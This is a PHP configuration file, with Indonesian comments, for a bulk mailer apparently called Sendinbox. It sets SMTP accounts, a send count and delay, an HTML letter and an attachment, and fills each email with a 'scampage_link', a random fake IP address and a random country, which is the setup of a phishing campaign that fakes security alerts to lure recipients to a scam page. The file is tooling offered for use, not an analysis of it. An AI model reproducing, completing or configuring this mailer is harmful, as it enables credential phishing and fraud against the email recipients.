<?php
/**
 * @Author: Eka Syahwan
 * @Date:   2017-09-14 06:35:55
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2017-10-02 19:12:49
 */
require_once 'autoload.php';
class Config
{
	function alias($data  , $email ){
		$this->modules = new SendinboxModules;	
		$config = $this->setting();
		$data   = str_replace("{date}", date("F j, Y, g:i a") , $data);
		$data 	= str_replace("{email}", $email , $data);
		$data 	= str_replace("{ip}", rand(10,999).".".rand(10,999).".".rand(10,999).".".rand(10,999) , $data);
		$data 	= str_replace("{link}", $config['scampage_link'], $data);
		$data 	= str_replace("{negara}", $this->modules->negara()[value] , $data);
		$data 	= $this->modules->check_random($data);
		return $data;
	}
	function setting(){
		return array(
			'scampage_link' 	=> '', 									// options
			'number' 			=> 5,  									// jumlah email yang di kirim
			'delay'  			=> 15, 									// delay setelah mengirim email yang di kirim 
		);
	}
	function smtp()
	{
		/*	----------------------------------------------------------------				    
			- HARAP DI PERHATIKAN SAAT KONFIGURASI KARENA SENSIF. 
			- ISILAH DATA DI DALAM KUTIP ATAU GANTI ... DENGAN DATA MU
			- Kesalahan Smtp Connect() karena kurang teliti atau memang smtp itu mati.
			----------------------------------------------------------------
		*/

		return array(

			/*------------- Konfigurasi SMTP -------------*/
			array(
				'smtp_user' 	=>  'example@gmail.com',
				'smtp_pass' 	=>  'example@gmail.com',
				'smtp_host' 	=>  'smtp.gmail.com',
				'smtp_port' 	=>  '587', // 587 atau 465 [587 = tls | 465 = ssl]
				'smtp_secure' 	=>  'tls', // tls atau ssl
				'recipients' 	=> array(
					'from_name'  => 'From Name',
					'from_email' => 'example@gmail.com',
				),
				'content' 	=> array(
					'format' => array(
						'MASUKAN SUBJECT DISINI' => 'letter.html',  // hapus line ini bila tidak digunakan
					),
					'attachments'=> array(
						'test.pdf', // masukan file attachments di folder attachments , jika tidak di perlukan silahkan rubah namanya menjadi test.pdf
					),
				),
			),
			/*--------------------------------------------*/

		);
	}
	function negara(){
		$countries = array("Afghanistan", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and Herzegowina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, the Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia (Hrvatska)", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "East Timor", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "France Metropolitan", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard and Mc Donald Islands", "Holy See (Vatican City State)", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Kyrgyzstan", "Lao, People's Democratic Republic", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia, The Former Yugoslav Republic of", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, Federated States of", "Moldova, Republic of", "Monaco", "Mongolia", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Seychelles", "Sierra Leone", "Singapore", "Slovakia (Slovak Republic)", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia and the South Sandwich Islands", "Spain", "Sri Lanka", "St. Helena", "St. Pierre and Miquelon", "Sudan", "Suriname", "Svalbard and Jan Mayen Islands", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan, Province of China", "Tajikistan", "Tanzania, United Republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "United States Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (U.S.)", "Wallis and Futuna Islands", "Western Sahara", "Yemen", "Yugoslavia", "Zambia", "Zimbabwe");
		return $countries;
	}
}